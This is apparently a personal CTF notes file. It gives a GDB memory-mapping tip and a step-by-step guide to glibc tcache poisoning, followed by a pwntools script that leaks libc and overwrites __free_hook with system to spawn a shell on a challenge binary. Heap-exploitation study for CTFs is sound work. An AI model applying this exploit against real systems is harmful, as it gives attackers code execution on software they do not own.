# NOTE CTF
This is a note for the CTF challenges I have solved. It contains write-ups, hints, and resources that I found useful during the competitions.

## GDB

- `info proc mappings` : is useful to see the memory layout of the process for *ASLR* challenges.
  - **Example output**:
    - `0x7458f3059000     0x7458f307b000    0x22000        0x0  r--p   /.../libc.so.6` : is the libc address range. The base address is `0x7458f3059000`. Most of the time this is the **first address** displayed by this command for the libc path.
    - `0x7458f324d000     0x7458f324e000     0x1000        0x0  r--p   /.../binary` : is the binary address range. The base address is `0x7458f324d000`. Most of the time this is the **first address** displayed by this command for the binary path.

## Tcache poisoning

Tcache poisoning is a heap exploitation technique that targets the tcache (thread-local cache) mechanism in modern versions of the GNU C Library (glibc). Tcache is used to speed vup memory allocation and deallocation by caching small chunks of memory. 

The tcache is an stack-like LIFO structure that can hold up to 7 chunks of the same size class. When a chunk is freed, it is added to the tcache for its size class. When a chunk of that size is requested, it is taken from the tcache if available.

### Prerequisites

Need to have acces to `malloc`, `free`, an `read malloced` chunk and an `edit malloced` chunk function.

### Steps

1. **Fill the tcache**: Allocate 9 chunks of the same size (e.g., 0x20 bytes).
2. **Allocate big chunk**: Allocate a big chunk (e.g., 0x450 bytes) for a future leak.
3. **Allocate small chunk**: Allocate a small chunk (e.g., 0x20 bytes) for a future leak.
4. **Free chunks**: Free from the third chunk to the ninth chunk (7 chunks in total) to fill the tcache for that size class.
5. **Free the big chunk**: Free the big chunk to place it in the unsorted bin. (offset 10)
6. **Display the big chunk**: Display the content of the big chunk to leak a libc address. Calculate the libc base address using the leaked address and the known offset of `main_arena`.
7. **Edit a small chunk**: Edit the eighth chunk to overwrite its forward pointer (fd) with the address of `__free_hook` (calculated using the libc base address). Be cause it's the second last chunk freed, it will be the first chunk allocated in the next allocation of that size.
8. **Allocate chunks**: Allocate three chunks of the same size (0x20 bytes). The first allocation will return a normal chunk, the second allocation will be use as argument for the next step, and the third allocation will return a chunk at the address of `__free_hook`. 
9. **Overwrite `__free_hook`**: Edit the third allocated chunk to overwrite `__free_hook` with the address of `system` (calculated using the libc base address) and overwrite the second allocated chunk with `/bin/sh`.
10. **Trigger the exploit**: Free the second allocated chunk (which contains `/bin/sh`). This will call `system("/bin/sh")`, giving you a shell.

### Example

```python
from pwn import *

bin_size = 10

## ADD 9 SONGS FROM 0 to 8

for i in range(9):
    add_song(p, bin_size, b'A' * 10)

# 0x450 -> large to leak main_arena
# Not store in tcache
# metadata pointer libc (main_arena)
add_song(p, 0x450, b'AA') # idx 9

# Here the bin size is not mandatory

add_song(p, bin_size, b'AA') # idx 10

## FREE FROM 2 to 8
for i in range(2, 9):
    delete_song(p, i)

## tcache full max 7 chunks of same size

## FREE 9
delete_song(p, 9)

## VIEW 9 TO LEAK MAIN ARENA ADDRESS
leak = view_song(p, 9)
libc.address = u64(leak.ljust(8, b'\x00')) - 0x1ecbe0 # offset main_arena

print(f'LIBC BASE: {hex(libc.address)}')

## EDIT FD to point to __free_hooks
edit_song(p, 7, 10, p64(libc.symbols['__free_hook']))

add_song(p, bin_size, b'AA') # idx 11
add_song(p, bin_size, b'/bin/sh\x00') # idx 12
add_song(p, bin_size, p64(libc.symbols['system'])) # idx 13 -> __free_hook = system

delete_song(p, 12)

p.interactive()
```
```
